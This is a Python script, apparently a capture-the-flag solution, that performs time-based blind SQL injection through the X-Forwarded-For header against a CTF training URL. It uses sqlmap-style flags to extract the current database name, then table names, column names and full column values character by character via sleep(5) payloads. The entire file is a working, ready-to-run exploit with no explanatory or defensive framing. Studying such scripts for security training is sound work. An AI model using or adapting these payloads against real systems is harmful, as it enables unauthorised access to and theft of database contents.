#!/usr/bin/env python3
import requests
import sys


def get_cur_db_name():
    # get the length of the name of current database
    start = 0
    end = 8
    while True:
        middle = int(start + (end - start) / 2)
        header = {
            'X-Forwarded-For': "1' and (select case when (length(database())>{}) then 0 else sleep(5) end) and '1'='1".format(
                middle)}
        try:
            r = requests.get(url=url, headers=header, timeout=5)
            start = middle
        except:
            end = middle
        if start + 1 == end:
            break
    cur_db_len = end

    # get the name of current database
    cur_db_name = ''
    for i in range(cur_db_len):
        start = 0
        end = 128
        while True:
            middle = int(start + (end - start) / 2)
            header = {
                'X-Forwarded-For': "1' and (select case when ord(substring(database() from {} for 1))>{} then 0 else sleep(5) end) and '1'='1".format(
                    i + 1, middle)}
            try:
                r = requests.get(url=url, headers=header, timeout=5)
                start = middle
            except:
                end = middle
            if start + 1 == end:
                cur_db_name = cur_db_name + chr(end)
                break
    return cur_db_name


def get_db_tables_names(db_name):
    # get the names of the tables of the database
    # return a string 'table_name1;table_name2;table_name3...'
    i = 1
    table_names = ''
    while True:
        start = 0
        end = 128
        while True:
            middle = int(start + (end - start) / 2)
            header = {
                'X-Forwarded-For': "1' and (select case when ord(substring((select group_concat(table_name separator ';') from information_schema.tables where table_schema='{}') from {} for 1))>{} then sleep(5) else 0 end) and '1'='1".format(
                    db_name, i, middle)}
            try:
                r = requests.get(url=url, headers=header, timeout=5)
                end = middle
            except:
                start = middle
            if start + 1 == end:
                if end != 1:
                    table_names = table_names + chr(end)
                break
        if end == 1:
            break
        else:
            i = i + 1
    return table_names


def get_db_table_columns_names(table_name):
    # get the name of columns
    # return a string 'column_name1;column_name2;column_name3...'
    i = 1
    column_names = ''
    while True:
        start = 0
        end = 128
        while True:
            middle = int(start + (end - start) / 2)
            header = {
                'X-Forwarded-For': "1' and (select case when ord(substring((select group_concat(column_name separator ';') from information_schema.columns where table_name='{}') from {} for 1))>{} then sleep(5) else 0 end) and '1'='1".format(
                    table_name, i, middle)}
            try:
                r = requests.get(url=url, headers=header, timeout=5)
                end = middle
            except:
                start = middle
            if start + 1 == end:
                if end != 1:
                    column_names = column_names + chr(end)
                break
        if end == 1:
            break
        else:
            i = i + 1
    return column_names


def get_db_table_column_values(table_name, column_name):
    # get the value of the column
    # return a string 'value1;value2;value3...'
    i = 1
    values = ''
    while True:
        start = 0
        end = 128
        while True:
            middle = int(start + (end - start) / 2)
            header = {
                'X-Forwarded-For': "1' and (select case when ord(substring((select group_concat({0} separator ';') from {1}) from {2} for 1))>{3} then sleep(5) else 0 end) and '1'='1".format(
                    column_name, table_name, i, middle)}
            try:
                r = requests.get(url=url, headers=header, timeout=5)
                end = middle
            except:
                start = middle
            if start + 1 == end:
                if end != 1:
                    values = values + chr(end)
                break
        if end == 1:
            break
        else:
            i = i + 1
    return values


if __name__ == '__main__':
    url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'
    cmd = sys.argv
    if cmd[1] == '--current-db':
        cur_db_name = get_cur_db_name()
        print('the name of the current database is {}'.format(cur_db_name))
    elif cmd[1] == '-D':
        db_name = cmd[2]
        if cmd[3] == '--tables':
            tables_names = get_db_tables_names(db_name).split(';')
            print('the tables_names of the {} are '.format(db_name), end='')
            for j in range(len(tables_names)):
                print(tables_names[j], end=',')
            print()
        elif cmd[3] == '-T':
            table_name = cmd[4]
            if cmd[5] == '--columns':
                columns_names = get_db_table_columns_names(table_name).split(';')
                print('the columns_names of the {} of the {} are '.format(table_name, db_name), end='')
                for j in range(len(columns_names)):
                    print(columns_names[j], end=',')
                print()
            elif cmd[5] == '-C':
                column_name = cmd[6]
                if cmd[7] == '--dump':
                    values = get_db_table_column_values(table_name, column_name).split(';')
                    print('the values of the {} of the {} of the {} are '.format(column_name, table_name, db_name), end='')
                    for j in range(len(values)):
                        print(values[j], end=',')
                    print()
